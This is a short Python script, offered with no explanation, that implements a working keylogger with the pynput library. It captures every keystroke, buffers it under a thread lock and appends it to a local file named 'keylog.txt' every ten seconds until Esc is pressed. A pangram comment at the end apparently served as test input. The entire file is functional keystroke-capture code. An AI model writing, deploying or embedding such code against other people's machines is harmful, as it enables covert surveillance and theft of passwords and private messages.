import threading
from pynput import keyboard
import time

logged_keys = []
lock = threading.Lock()

write_interval = 10
filename = "keylog.txt"
stop_event = threading.Event()

def on_press(key):
    try:
        with lock:
            logged_keys.append(key.char)
    except AttributeError:
        with lock:
            if key == keyboard.Key.space:
                logged_keys.append(' ')
            else:
                logged_keys.append(f'[{key.name}]')

def on_release(key):
    if key == keyboard.Key.esc:
        stop_event.set()
        return False

def write_logged_keys():
    while not stop_event.is_set():
        time.sleep(write_interval)
        with lock:
            if logged_keys:
                try:
                    with open(filename, 'a') as f:
                        f.write(''.join(logged_keys))
                        logged_keys.clear()
                except Exception as e:
                    print(f"Error writing to file: {e}")

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

write_thread = threading.Thread(target=write_logged_keys)
write_thread.start()

listener.join()
stop_event.set()
write_thread.join()
#the quick brown fox jumped over a lazy dog